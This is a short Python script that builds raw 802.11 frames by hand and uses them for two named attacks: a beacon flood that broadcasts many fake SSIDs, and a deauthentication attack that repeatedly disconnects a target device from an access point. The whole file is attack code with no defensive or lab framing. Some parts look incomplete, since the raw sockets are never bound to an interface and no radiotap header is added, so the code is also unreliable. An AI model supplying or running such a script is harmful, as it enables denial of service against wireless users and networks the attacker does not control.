import socket
import time

def beacon_flood(ssid, count=100, interval=0.05):
    """
    Perform a beacon flood attack with fake SSIDs.

    Args:
        ssid (str): The base SSID to use for the fake networks.
        count (int): Number of fake SSIDs to broadcast.
        interval (float): Time (in seconds) between each broadcast.
    """
    print(f"Starting beacon flood with {count} fake SSIDs...")
    for i in range(count):
        fake_ssid = f"{ssid}_Fake_{i}"
        send_beacon(fake_ssid)
        time.sleep(interval)
    print("Beacon flood completed.")

def send_beacon(fake_ssid):
    """
    Send a fake beacon frame with a given SSID.

    Args:
        fake_ssid (str): The fake SSID to broadcast.
    """
    # Construct a minimal beacon frame
    beacon_frame = (
        b"\x80\x00\x00\x00"  # Frame Control + Duration
        b"\xFF\xFF\xFF\xFF\xFF\xFF"  # Destination MAC (broadcast)
        b"\x00\x11\x22\x33\x44\x55"  # Source MAC (example)
        b"\x00\x11\x22\x33\x44\x55"  # BSSID (example)
        b"\x00\x00"  # Sequence Control
        b"\x00\x00\x00\x00\x00\x00\x00\x00"  # Timestamp
        b"\x64\x00"  # Beacon Interval
        b"\x01\x04"  # Capabilities
    )

    # Add SSID parameter
    ssid_parameter = (
        b"\x00" + bytes([len(fake_ssid)]) + fake_ssid.encode("utf-8")
    )

    # Final beacon frame
    final_frame = beacon_frame + ssid_parameter

    # Send the beacon frame
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    try:
        sock.send(final_frame)
        print(f"Sent beacon for SSID: {fake_ssid}")
    except Exception as e:
        print(f"Error sending beacon: {e}")
    finally:
        sock.close()

def deauth_attack(target_mac, ap_mac, count=100, interval=0.1):
    """
    Perform a deauthentication attack.

    Args:
        target_mac (str): The MAC address of the target device.
        ap_mac (str): The MAC address of the access point.
        count (int): Number of deauth frames to send.
        interval (float): Time (in seconds) between each frame.
    """
    print(f"Starting deauthentication attack against {target_mac} from {ap_mac}...")
    for i in range(count):
        send_deauth_frame(target_mac, ap_mac)
        time.sleep(interval)
    print("Deauthentication attack completed.")

def send_deauth_frame(target_mac, ap_mac):
    """
    Send a deauthentication frame.

    Args:
        target_mac (str): The MAC address of the target device.
        ap_mac (str): The MAC address of the access point.
    """
    # Construct a minimal deauthentication frame
    deauth_frame = (
        b"\xc0\x00"  # Frame Control
        + b"\x00\x00"  # Duration
        + bytes.fromhex(target_mac.replace(":", ""))  # Destination MAC
        + bytes.fromhex(ap_mac.replace(":", ""))  # Source MAC
        + bytes.fromhex(ap_mac.replace(":", ""))  # BSSID
        + b"\x00\x00"  # Sequence Control
        + b"\x07\x00"  # Reason Code
    )

    # Send the deauth frame
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    try:
        sock.send(deauth_frame)
        print(f"Sent deauth frame to {target_mac} from {ap_mac}")
    except Exception as e:
        print(f"Error sending deauth frame: {e}")
    finally:
        sock.close()
